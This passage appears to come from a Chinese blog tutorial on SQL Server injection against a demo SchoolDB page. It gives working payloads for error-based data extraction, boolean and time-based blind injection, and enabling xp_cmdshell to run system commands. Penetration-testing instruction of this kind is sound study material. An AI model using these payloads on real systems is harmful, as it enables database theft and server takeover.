+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">--注释 ：</span><br><span class="line">data_type(length) 转换为⽬标数据类型（带有可选的长度）</span><br><span class="line">data_to_be_converted 含有需要转换的值</span><br><span class="line">style 规定⽇期/时间的输出格式（可省略）</span><br></pre></td></tr></table></figure>
+
+<p>对于<code>convert(int,@@version)</code>，convert函数会首先执行第二给参数指定的SQL查询，然后尝试将查询结果转为int类型。但是由于查询语句查询出来的结果时varchar类型，无法转为指定的int类型，因此convert函数会爆出一个SQLSever的错误消息，格式是<code>&quot;SQL查询结果&quot;无法转换为&quot;int&quot;类型</code>，这样攻击者就可以利用报错来获取到SQL的查询结果</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,db_name())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png"></p>
+<p>除了使用函数以外，在两个不同类型的数据进行比较时，也会爆出SqlServer的错误信息，也是一种利用方法</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png"></p>
+<p>首先查询数据库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">0</span>))</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询第二个数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以通过<code>for xml path</code>，查询所有数据库的名字，<code>FOR XML PATH(&#39;&#39;)</code> 表示输出 XML，但不加任何标签。通常可以配合<code>stuff()</code>使用，用来拼接多个值并去除第一个多余分隔符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png"></p>
+<p>爆出所有表名，但是其中存在一些系统表，可以通过<code>xtype=&#39;U&#39;</code>来过滤出用户表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sysobjects WHERE xtype = &#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png"></p>
+<p>接下来就是爆出<code>Students</code>表的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and  1=convert(int,stuff((select quotename(name) from SchoolDB.sys.columns where object_id=object_id(&#x27;Students&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png"></p>
+<p>最后爆数据即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(StudentID) from Students for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png"></p>
+<p>剩下的报错函数原理也是相似的，读者可以自行查阅资料</p>
+<h4 id="IeAWT">布尔盲注</h4>
+如果存在没有回显位 或者 不能直接通过页面返回内容查看数据库信息时，我们就可以通过布尔盲注去查询信息。页面会根据用户输入只回显true和flase，则可以通过构造逻辑判断来得到想要的信息
+
+<p>首先需要我们去判断是存在盲注，使用以下注入语句测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=1--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=2--+</span><br></pre></td></tr></table></figure>
+
+<p>不管是对于数据库名、表名还是列名的盲注，流程都是相类似的</p>
+<p>首先猜解数据库名的长度，正常回显时，说明我们的判断是正确的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//回显正常</span><br><span class="line">SqlServer.php?id=101 and len((select db_name()))=8--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and len((select db_name()))=4--+</span><br></pre></td></tr></table></figure>
+
+<p>猜解数据库名字，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取数据库名的第一个字符ascii码为83</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=83 -- </span><br><span class="line">//获取数据库名的第一个字符ascii码为99</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=99 -- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png"></p>
+<p>后续的表名、列名和数据，只需要替换响应的SQL语句即可</p>
+<h4 id="KxKAK">延时注入</h4>
+这里主要是使用`WAITFOR DELAY '0:0:n'`这个语句表示要延迟几秒，他的作用就是等待待定时间，然后再执行后续语句。如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。
+
+<p>利用该注入语句，可以判断此处是否存在延时注入</p>
+<p>观察浏览器f12，观察时间确认成功延时，代表存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 WAITFOR DELAY &#x27;0:0:5&#x27; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png"></p>
+<p>后续利用和布尔注入相类似，判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 if (len((select db_name()))=8) WAITFOR DELAY &#x27;0:0:5&#x27; --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png"></p>
+<p>然后一个字符一个字符进行猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 if (ascii(substring((select db_name()),1,1))=83) WAITFOR DELAY &#x27;0:0:5&#x27;-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png"></p>
+<p>后续只需要替换SQL语句查询点，就可以注入其他数据</p>
+<h2 id="zxVml">SqlServer命令执行</h2>
+MSSQL数据库中，存在`xp_cmdshell`函数：SQL中运行系统命令行的系统存储过程，允许 SQL Server 以服务账户的身份执行 Windows 命令或外部程序。如果该命令开启时，我们就可以执行系统命令。
+
+<p>我们现在在判断了网站权限是<code>sa</code>权限后，想要执行系统命令，就先要判断<code>xp_cmdshell</code>是否存在，当页面正常返回时，说明该命令是开启的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><code>xp_cmdshell</code>默认在mssql2000中是开启的，在mssql2005后版本默认禁止。2005的<code>xp_cmdshell</code>的权限一般是<code>system</code>，而2008多数为<code>nt authority\network service</code></p>
+<p>但是如果有管理员<code>sa</code>权限，则可以用<code>sp_configure</code>重新开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启 xp_cmdshell：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;</span><br><span class="line">关闭 xp_cmdshell：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure</span><br></pre></td></tr></table></figure>
+
+<p>可以使用堆叠的方式进行执行命令，但是有些命令的执行需要较高权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 ;exec master..xp_cmdshell &quot;命令&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过运行<code>whoami</code>，可以看到sqlserver的权限为<code>nt service\mssqlserver</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
       </tags>
   </entry>
 </search>
